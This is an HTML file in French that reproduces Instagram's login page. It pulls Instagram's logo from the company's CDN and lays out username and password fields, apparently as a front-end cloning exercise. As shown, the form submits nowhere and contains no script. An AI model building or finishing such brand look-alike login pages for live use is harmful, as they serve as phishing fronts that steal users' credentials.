<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Page de connection</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <form>
  <div class="langue"><p>Français</p></div>
    <div aria-disabled="false" role="heading" style="cursor: pointer;" tabindex="0"><i data-visualcompletion="css-img" aria-label="Instagram" class="nom_instagram" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yv/r/KoLLpWDb4f6.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></div>
    <div class="box">
      <div class="ligne"></div>
      <p class="ou">ou</p>
      <div class="inputs">
        <input type="identifiant" class="input" placeholder=" Num. téléphone, nom d'utilisateur(ice) ..."/>
        <input type="password" class="input" placeholder=" Mot de passe">
      </div>
      <span class="span1">Mot de passe oublié ?</span>
      <div class="bouton">
        <button type="submit">Se connecter</button>
      </div>
    </div>
    <p class="inscription">Vous n'avez pas de compte ? <span class="span2">Inscrivez-vous</span></p>
  </form>
</body>
</html>
